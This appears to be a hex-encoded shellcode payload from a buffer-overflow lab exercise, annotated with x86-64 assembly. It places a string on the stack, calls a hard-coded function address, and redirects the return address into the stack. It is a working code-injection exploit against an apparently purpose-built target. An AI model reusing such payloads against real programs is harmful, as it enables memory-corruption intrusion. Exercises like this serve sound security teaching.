48 81 EC 00 03 00 00                    # sub $0x300, %rsp #

# 48 B8 5E 6A 6B 67 72 61 6E 70 #           
48 B8 70 6E 61 72 67 6B 6A 5E           # movabs $0x706E6172676B6A5E, %rax  # 
C6 44 24 08 00                          # movb $0x00, 8(%rsp) #
48 89 04 24                             # mov    %rax, (%rsp)               # 
48 89 E7                                # mov    %rsp, %rdi                 # 

48 B8 4F 09 40 00 00 00 00 00           # movabs $0x40094f, %rax #
FF D0                                   # call *%rax #
48 81 C4 00 03 00 00                    # add $0x300, %rsp #
68 75 0A 40 00                          # push $0x400a75 #
C3                                      # ret #

D0 ff ff 03 00 00 00 00
50 fd ff 03 00 00 00 00
